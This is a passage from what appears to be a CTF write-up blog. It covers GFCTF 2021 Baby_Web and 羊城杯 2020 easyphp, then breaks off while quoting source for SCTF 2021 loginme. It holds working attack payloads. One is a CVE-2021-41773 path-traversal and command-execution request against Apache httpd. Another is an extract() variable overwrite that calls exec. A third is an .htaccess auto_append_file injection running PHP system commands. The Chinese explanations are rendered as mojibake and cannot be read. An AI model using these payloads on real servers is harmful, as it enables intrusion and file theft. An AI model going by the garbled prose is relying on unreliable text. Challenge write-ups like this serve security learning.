<h2 id="GFCTF-2021-Baby-Web"><a href="#GFCTF-2021-Baby-Web" class="headerlink" title="[GFCTF 2021]Baby_Web"></a>[GFCTF 2021]Baby_Web</h2><p>æ‰“å¼€åæ²¡ä»€ä¹ˆåˆ©ç”¨ç‚¹ï¼Œæºç ä¸­è¯´äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--æºç è—åœ¨ä¸Šå±‚ç›®å½•xxx.php.txté‡Œé¢ï¼Œä½†ä½ æ€ä¹ˆæ‰èƒ½çœ‹åˆ°å®ƒå‘¢?--&gt;</span><br></pre></td></tr></table></figure>

<p>åˆè¯•äº†è¯•ç›®å½•ç©¿è¶Šï¼Œä¸è¡Œå•Šã€‚</p>
<p>æ‰«æ‰«ç›®å½•çœ‹çœ‹</p>
<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205184800886.png" alt="image-20241205184800886" style="zoom:80%;" />

<p>ä¸­é—´æœ‰ä¸€ä¸ª&#x2F;etc&#x2F;passwdçš„ç¥å¥‡ä¸œè¥¿ï¼Œè¯•è¯•</p>
<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205184816327.png" alt="image-20241205184816327" style="zoom: 67%;" />

<p>æˆ‘å‹’ä¸ªä»»æ„æ–‡ä»¶è¯»å–</p>
<p>æ­¤å¤„å…¶å®æ˜¯ä¸€ä¸ªCVE-2021-41773</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&#x27; -d &#x27;A=|echo;id&#x27;</span><br></pre></td></tr></table></figure>

<p>pocæ‰§è¡Œä¸äº†ï¼Œæ²¡åŠæ³•ï¼Œæ­£å¸¸æ‰“å§</p>
<p>è¯»å–ä¸€ä¸‹ä¸Šå±‚ç›®å½•çš„index.php.txt</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;main&quot;</span>,<span class="string">&quot;main&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;Class.php&quot;</span>;</span><br><span class="line"><span class="variable">$temp</span> = <span class="keyword">new</span> <span class="title class_">Temp</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="variable">$temp</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205185132883.png" alt="image-20241205185132883"></p>
<p>ä¸è®©æˆ‘è¯»ï¼Ÿï¼Ÿï¼ï¼</p>
<p>ä¸ºå•¥å•Šï¼Œè¯•è¯•ä¹‹å‰çš„.txtæ ¼å¼ï¼Œå¯ä»¥äº†ï¼</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">defined</span>(<span class="string">&#x27;main&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;no!!&quot;</span>);</span><br><span class="line">Class Temp&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$date</span>=[<span class="string">&#x27;version&#x27;</span>=&gt;<span class="string">&#x27;1.0&#x27;</span>,<span class="string">&#x27;img&#x27;</span>=&gt;<span class="string">&#x27;https://www.apache.org/img/asf-estd-1999-logo.jpg&#x27;</span>];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$template</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;date = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;date,<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getTempName</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$dir</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dir</span> === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;template = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;..&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;./template/admin/&#x27;</span>.<span class="variable">$template</span>);</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">is_file</span>(<span class="variable">$this</span>-&gt;template))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;no!!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;template = <span class="string">&#x27;./template/index.html&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$space</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">extract</span>(<span class="variable">$this</span>-&gt;date);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getTempName</span>(<span class="variable">$template</span>,<span class="variable">$space</span>);</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;template);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">listdata</span>(<span class="params"><span class="variable">$_params</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$system</span> = [</span><br><span class="line">            <span class="string">&#x27;db&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;app&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;num&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;sum&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;form&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;page&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;site&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;flag&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;not_flag&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;show_flag&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;more&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;catid&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;field&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;order&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;space&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;table&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;table_site&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;total&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;join&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;on&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;action&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;return&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;sbpage&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;module&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;urlrule&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;pagesize&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;pagefile&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$param</span> = <span class="variable">$where</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_params</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_params</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$params</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27; &#x27;</span>, <span class="variable">$_params</span>);<span class="comment">//action=list module=$mod</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$params</span>[<span class="number">0</span>], [<span class="string">&#x27;list&#x27;</span>,<span class="string">&#x27;function&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$params</span>[<span class="number">0</span>] = <span class="string">&#x27;action=&#x27;</span>.<span class="variable">$params</span>[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$params</span> <span class="keyword">as</span> <span class="variable">$t</span>) &#123;</span><br><span class="line">            <span class="variable">$var</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$t</span>, <span class="number">0</span>, <span class="title function_ invoke__">strpos</span>(<span class="variable">$t</span>, <span class="string">&#x27;=&#x27;</span>));</span><br><span class="line">            <span class="variable">$val</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$t</span>, <span class="title function_ invoke__">strpos</span>(<span class="variable">$t</span>, <span class="string">&#x27;=&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$var</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$system</span>[<span class="variable">$var</span>])) &#123; </span><br><span class="line">                <span class="variable">$system</span>[<span class="variable">$var</span>] = <span class="variable">$val</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$param</span>[<span class="variable">$var</span>] = <span class="variable">$val</span>; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// action</span></span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$system</span>[<span class="string">&#x27;action&#x27;</span>]) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;function&#x27;</span>:</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="keyword">return</span>  <span class="string">&#x27;hacker!!&#x27;</span>;</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (!<span class="title function_ invoke__">function_exists</span>(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&#x27;hacker!!&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$force</span> = <span class="variable">$param</span>[<span class="string">&#x27;force&#x27;</span>];</span><br><span class="line">                <span class="keyword">if</span> (!<span class="variable">$force</span>) &#123;</span><br><span class="line">                    <span class="variable">$p</span> = [];</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="variable">$param</span> <span class="keyword">as</span> <span class="variable">$var</span> =&gt; <span class="variable">$t</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$var</span>, <span class="string">&#x27;param&#x27;</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="variable">$n</span> = <span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$var</span>, <span class="number">5</span>));</span><br><span class="line">                            <span class="variable">$p</span>[<span class="variable">$n</span>] = <span class="variable">$t</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$p</span>) &#123;</span><br><span class="line"></span><br><span class="line">                        <span class="variable">$rt</span> = <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>], <span class="variable">$p</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="variable">$rt</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable">$rt</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;list&#x27;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$this</span>-&gt;date);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆ</p>
<p>new Tempæ—¶ä¼šå¯¹this-&gt;dateèµ‹å€¼ï¼Œç„¶åè¿›å…¥display()æ–¹æ³•åå‘ç°æœ‰ä¸€ä¸ªextract($this-&gt;date);ï¼Œè¿™å¯ä»¥è¿›è¡Œå˜é‡è¦†ç›–ï¼Œçœ‹åé¢$this-&gt;getTempName($template,$space);ï¼Œè·Ÿè¿›åå‘ç°$diréœ€è¦ä¸ºadminï¼Œé‚£ä¹ˆæˆ‘ä»¬å˜é‡è¦†ç›–å³å¯ï¼ŒPOSTä¸€ä¸ªspace&#x3D;adminï¼Œæ¥ç€çœ‹åé¢if(!is_file($this-&gt;template))ï¼Œè®©GET ?file&#x3D;index.htmlå³å¯ã€‚</p>
<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205190842283.png" alt="image-20241205190842283" style="zoom:80%;" />

<p>ç„¶åæ­¤å¤„includeäº†è¿™ä¸²phpä»£ç ï¼Œè°ƒç”¨äº†listdataæ–¹æ³•ï¼Œä¼ å‚action&#x3D;list module&#x3D;$mod</p>
<p>è¿™é‡Œåªæœ‰$modæ—¶å¯æ§çš„ã€‚</p>
<blockquote>
<p>action&#x3D;list&amp;module&#x3D;$mod</p>
<p>mod&#x3D;xxx action&#x3D;function </p>
<p>action&#x3D;list module&#x3D;xxx action&#x3D;function  force&#x3D;false name&#x3D;phpinfo()</p>
</blockquote>
<p>è¿™é‡Œåé¢ä¼ å…¥çš„actionæŠŠå‰é¢çš„listè¦†ç›–æ‰å°±å¯ä»¥äº†ï¼Œç”¨functionæ¥è¦†ç›–</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET:?filename=index.html</span><br><span class="line">POST:space=admin&amp;mod=xxx action=function  force=0 name=phpinfo</span><br></pre></td></tr></table></figure>

<p>åœ¨phpinfoé‡Œé¢å¯ä»¥æ‰¾åˆ°flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;45956a8b-37e3-43e1-9ec0-664239b74a90&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET:?filename=index.html</span><br><span class="line">POST:space=admin&amp;mod=xxx action=function  force=0 name=exec param=tac$&#123;IFS&#125;/f11111111aaaagggg&gt;1.txt</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205195913384.png" alt="image-20241205195913384"></p>
<h2 id="ç¾ŠåŸæ¯-2020-easyphp"><a href="#ç¾ŠåŸæ¯-2020-easyphp" class="headerlink" title="[ç¾ŠåŸæ¯ 2020]easyphp"></a>[ç¾ŠåŸæ¯ 2020]easyphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;on&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;html&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;type&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;flag&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;upload&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;file&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[^a-z\.]/&quot;</span>, <span class="variable">$filename</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span> . <span class="string">&quot;\nHello, world&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>å¾ˆå¥½ç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=b.php&amp;content=&lt;?php system(&#x27;ls /&#x27;);?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205202211925.png" alt="image-20241205202211925"></p>
<p>æ²¡æœ‰è§£æphpï¼Œä¸ºå•¥å•Šæ˜æ˜æ˜¯phpä½†æ˜¯è§£æä¸äº†ï¼Œå¯èƒ½æ˜¯é¶æœºç›®å½•ç¯å¢ƒä¸èƒ½è§£æphpæ–‡ä»¶</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205202303024.png" alt="image-20241205202303024"></p>
<p>ApacheæœåŠ¡å™¨</p>
<p>å°è¯•ç”¨.htaccessæ¥æ‰§è¡Œjpgæ–‡ä»¶ä¸­çš„phpä»£ç </p>
<p>ä½†æ˜¯è¿™é‡Œè¢«è¿‡æ»¤äº†å•Š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=.htaccess&amp;content=AddType application/x-http-php .jpg</span><br></pre></td></tr></table></figure>

<p>ä½†è¿™ä¸ªè¿‡æ»¤æ˜¯å¾ˆå¥½ç»•è¿‡çš„å¯ä»¥ç”¨åæ–œæ åŠ %0aæ¥ç»•è¿‡ï¼Œä½†æ˜¯è¿™æ ·çš„è¯å°±è¦æ±‚ä¸Šä¼ ä¸¤æ¬¡æ–‡ä»¶ï¼Œè€Œè¿™ä¸ªé¢˜ç›®ç¯å¢ƒä¸èƒ½ä¸Šä¼ ä¸¤æ¬¡æ–‡ä»¶ï¼Œå› æ­¤åªèƒ½ä¸Šä¼ ä¸€æ¬¡.htaccessï¼Œé‚£ä¹ˆèƒ½åˆ©ç”¨çš„å°±åªæœ‰index.phpäº†ï¼Œè¿™è¿˜ä¸å¦‚ç›´æ¥å†™å…¥index.phpæ–‡ä»¶å‘¢ï¼ä½†æ˜¯æ˜¯ä¸èƒ½è§£æçš„ã€‚å› æ­¤æˆ‘ä»¬åªèƒ½åˆ©ç”¨.htaccessæ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œæˆ–è€…å†™é©¬ï¼Œç®€å•ï¼</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_fi\%0ale .htaccess%0a%23&lt;?php system(&#x27;ls /&#x27;);?&gt;\</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=.htaccess&amp;content=php_value auto_append_fi\%0Ale .htaccess%0A%23&lt;?php system(&#x27;tac /f*&#x27;);?&gt;\</span><br></pre></td></tr></table></figure>





<h2 id="SCTF-2021-loginme"><a href="#SCTF-2021-loginme" class="headerlink" title="[SCTF 2021]loginme"></a>[SCTF 2021]loginme</h2><p>è·å¾—æºç </p>
<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206105852832.png" alt="image-20241206105852832" style="zoom:80%;" />

<p>è¿‡æ»¤äº†ä¿©ï¼Œå¯ä»¥ç”¨ç”¨X-Real-IP</p>
<p>ç„¶åçœ‹çœ‹æºç route.go</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> route</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	_ <span class="string">&quot;embed&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;html/template&quot;</span></span><br><span class="line">	<span class="string">&quot;loginme/structs&quot;</span></span><br><span class="line">	<span class="string">&quot;loginme/templates&quot;</span></span><br><span class="line">	<span class="string">&quot;strconv&quot;</span></span><br><span class="line"></span><br><span class="line">	